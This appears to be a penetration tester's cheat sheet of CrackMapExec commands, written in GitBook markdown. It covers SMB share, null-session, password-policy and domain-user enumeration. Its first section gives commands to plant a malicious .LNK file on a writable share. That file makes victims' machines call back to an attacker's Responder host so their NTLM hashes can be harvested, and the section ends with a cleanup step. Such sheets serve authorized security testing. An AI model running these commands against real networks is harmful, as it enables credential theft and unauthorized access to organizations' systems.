---
description: Examples of CrackMapExec commands that I use throughout penetration tests.
---

# CrackMapExec Examples

## Harvest NTLMv2/v1 credentials if you have write-access to a share.

Enumerate the hosts shares

```bash
crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] --shares
```

Create a malicious .LNK file calling back to your Responder.py IP

```bash
crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP]
```

After waiting and (hopefully) obtaining several NTLM hashes, cleanup the malicious file

```bash
crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP] CLEANUP=True
```

## Null Session Enumeration

Enumerate null sessions:

```bash
cme smb [TARGETS] -u '' -p ''
```

Enumerate domain password policy:

```bash
cme smb [TARGET] --pass-pol
```

Enumerate users (domain controller)

```bash
cme smb [TARGET] --users
```

## References

{% embed url="https://mpgn.gitbook.io/crackmapexec/smb-protocol/enumeration/enumerate-null-sessions" %}

{% embed url="https://twitter.com/mpgn_x64/status/1453018750253424643" %}
